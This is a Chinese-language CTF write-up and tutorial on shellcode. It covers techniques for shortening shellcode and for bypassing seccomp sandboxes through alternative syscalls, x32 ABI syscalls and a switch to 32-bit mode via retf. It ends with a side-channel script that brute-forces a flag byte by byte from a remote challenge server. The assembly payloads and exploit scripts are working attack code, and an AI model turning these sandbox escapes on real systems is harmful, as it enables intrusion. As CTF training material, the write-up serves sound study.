# shellcode+

本文介绍一些少见的shellcode题和利用手法 :一些常规函数绕过seccomp的方式、 x32ABI、32 mode、侧信道

## *O\缩短shellcode的小tricks*

pop,push的组合代替mov

xor reg,reg清空

cdq(edx==>0)清空

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/11/图片-7-1024x278.png" alt="img" style="zoom:50%;" />

xchg reg1,reg2交换寄存器的值

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/11/图片-8-1024x849.png" alt="img" style="zoom:50%;" />

短jmp：`jmp` 指令在 32 位和 64 位汇编中有不同的形式。短 `jmp` 是跳转到相对位置的指令，它非常紧凑，可以节省空间。举个例子：

jmp short label

jmp short .+2 ; 跳过接下来的2个字节（偏移量+2）

古早寄存器：可以利用一些**不常用的寄存器**，例如 `r8` 到 `r15` 来做一些计算，避免对常用寄存器进行过多操作，从而节省空间。

传参：

lea rdi, [name]….

name: db ‘/flag’, 0

## *一\常规的seccomp绕过*

#### *使用at/v/2系统调用*

这里分别指的是几个系统调用的后缀和前缀，比如：

- 使用`execveat`代替`execve`，拿到`shell`后，使用`shell`内置命令读取`flag`: `echo *; read FLAG < /flag;echo $FLAG`，否则使用子`shell`执行命令还是会被沙箱杀死。同样的，使用`openat`代替`open`。
- 使用`readv/writev`代替`read/write`
- 使用`mmap2`代替`mmap`
- 还有一些特殊的系统调用，使用`sendfile`，代替`read/write`。

***execveat\*：**

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/11/图片-4-1024x363.png" alt="img" style="zoom:50%;" />

可以发挥与exceve相类似的作用

int execveat(int dirfd, const char *pathname,char *const argv[], char *const envp[],int flags);

当参数pathname指向/bin/sh时（即第二个参数），并且argv，envp，flags参数为0时，此时无论dirfd为何值，都可以getshell

***openat：\***相当于第一个参数是文件描述符，第二个是文件名，第三个为0

int openat(int dirfd, const char *pathname, int flags, mode_t mode);

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/11/图片-5-1024x241.png" alt="img" style="zoom: 67%;" />

***sendfile：\***将文件描述符in的内容复制到文件描述符out中，

ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);

<img src="http://www.leidongzheng.com/wp-content/uploads/2024/11/图片-6-1024x140.png" alt="img" style="zoom: 67%;" />

显然上面的shellcode可以直接输出文件内容



## *二\利用x32ABI和32位模式的沙箱绕过*

### ***x32 ABI\***

x32 ABI是ABI (Application Binary Interface)，同样也是linux系统内核接口之一。x32  ABI允许在64位架构下（包括指令集、寄存器等）使用32位指针，从而避免64位指针造成的额外开销，提升程序性能。然而，除跑分、嵌入式场景外，x32 ABI的使用寥寥无几。前几年曾有过弃用x32 ABI的讨论，但其被最终决定保留，并在linux kernel中保留至今。

#### ***利用方式\***

x32 ABI与64位下的系统调用方法几乎无异，只不过系统调用号都是不小于0x40000000，并且要求使用32位指针。

具体的调用表可以查看系统头文件中的`/usr/src/linux-headers-$version-generic/arch/x86/include/generated/uapi/asm/unistd_x32.h`

因为没有限制sys_number<0x40000000，所以可以直接调用x32 abi，

orw shellcode如下：

```
lea rax,[rip]
add rax,0x200
mov rsp,rax ;  因为rsp被清空，先将栈迁移至可读写位置

mov eax,0x67616c66 ;  'flag'
push rax
mov rdi,rsp
xor rsi,rsi
mov rax,0x40000002 ;  open
syscall

mov rdi,rax
mov rax,rsp
add rax,0x100
mov rsi,rax
mov rdx,0x40
mov rax,0x40000000 ;  read
syscall

mov edi,2
mov rax,0x40000001 ;  write
syscall
```

### ***32位模式\***

32位模式即64位系统下运行32位程序的模式，此时CS寄存器的值为0x23。在该模式下，程序与在32位系统中运行几乎无异，即只能使用32位寄存器，所有指针必须为32位，指令集为32位指令集等。

与之相对地，64位模式对应的CS寄存器的值为0x33。

### ***进入32位模式\***

进入32位模式需要更改CS寄存器为0x23。retf (far return) 指令可以帮助我们做到这一点。retf指令相当于：

pop ip pop cs

需要注意的是，在使用pwntools构造shellcode时，需要指定retf的地址长度，即可以使用retfd和retfq。

#### 利用方式

因为进入32位模式后，sp, ip寄存器也会变成32位，所以需要将栈迁移至32位地址上；利用或构造32位地址的RWX内存段，写入32位shellcode；最后在栈上构造fake ip, cs，执行retf指令。

#### 利用条件

- 沙箱中不包含对arch==ARCH_x86_64的检测
- 存在或可构造32位地址的RWX内存段

```
mmap = '''
xor rax, rax
mov al, 9
mov rdi, 0x602000
mov rsi, 0x1000
mov rdx, 7
mov r10, 0x32
mov r8, 0xffffffff
mov r9, 0
syscall'''

read = '''
mov rax, 0
xor rdi, rdi
mov rsi, 0x602190
mov rdx, 100
syscall'''

retf = '''
xor rsp, rsp
mov esp, 0x602160
mov DWORD PTR [esp+4], 0x23
mov DWORD PTR [esp], 0x602190
retf
'''
sc = mmap + read + retf
f = asm(sc)
p.sendline(f)
```

其中，构造RWX内存段可使用mmap申请新的内存，或使用mprotect使已有的段变为RWX权限。

以上资料参考自：https://zqy.ink/2022/11/06/SeccompBypass/

其他的一些特殊shellcode：https://zqy.ink/2022/11/27/shellcodes/

三\*侧信道PWN*

dasctf的题，唯一看懂代码逻辑的题没有任何思路，还好纯真学长做出来了这题，哦！原来是侧信道爆破。这是第一次做侧信道的题

题目代码如下：

![img](http://www.leidongzheng.com/wp-content/uploads/2024/10/图片-25.png)

![img](http://www.leidongzheng.com/wp-content/uploads/2024/10/图片-26-1024x484.png)

先看代码，题目把flag读入内存，接着读入6字节的内容存入buf准备执行，显然是道shellcode题目，看到有沙箱那么用seccomp-tools分析一下

![img](http://www.leidongzheng.com/wp-content/uploads/2024/10/图片-27.png)

先分析一下汇编代码：

```
from pwn import *
context(os = 'linux',arch = 'amd64')
payload = '''
   xor byte ptr [rdi+1],2
   jz $
'''
print(asm(payload))
###输出为b'\x80w\x01\x02t\xfe'
```

***xor byte ptr [rdi+1],2\*** 的意思是比较rdi指向的地址+1位置和2是否相同

***jz $\*** 的意思是如果上一个指令结果为0则跳转回当前地址，如果结果为1则继续执行

接下来看输出**b’\x80w\x01\x02t\xfe’**，其中01是遍历爆破flag用的idx，而02是与flag比较的字符集

所以就能有代码：

```
from pwn import *
context.log_level = 'fatal'
#仅在致命错误时才会输出日志。
def get_p():
    return connect('node5.buuoj.cn',25871)
flag = b''
idx = 0
guess = string.printable #比较的字符集
while True:
    for i in guess:
        try:
            p = get_p()
            payload = b'\x80\x77'+p8(idx)+p8(ord(i))+b'\x74\xfe'
            p.send(payload)
            p.recv(timeout=4) 
#如果四秒没收到任何信息，说明程序被“困”在循环里了
            flag+=i.encode()
            idx += 1
            print(flag)
            break
        except EOFError:
#如果报错，说明比较错误，那么继续比较
            p.close()
            continue
```

